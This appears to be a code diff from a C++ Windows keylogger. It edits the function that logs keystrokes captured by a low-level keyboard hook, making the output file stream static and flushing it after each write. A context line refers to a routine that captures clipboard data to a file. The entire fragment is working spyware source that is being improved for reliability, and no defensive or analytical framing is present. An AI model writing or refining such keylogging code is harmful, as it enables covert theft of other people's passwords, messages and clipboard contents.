@@ -6,7 +6,7 @@
 // Logs the respective characters of the provided KBD hook.
 void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 {
-    std::wofstream out_file{ configuration::out_file, std::wofstream::app };
+    static std::wofstream out_file{ configuration::out_file, std::wofstream::app };
 
     const auto it = configuration::key_codes.find(kbd_hook->vkCode);
 
@@ -41,6 +41,9 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
         // If the conversion was successful, write the characters.
         if (result > 0) out_file << key_buffer;
     }
+
+    // Write all changes to the wofstream.
+    out_file << std::flush;
 }
 
 // Acquires and writes the current clipboard data to the provided file.
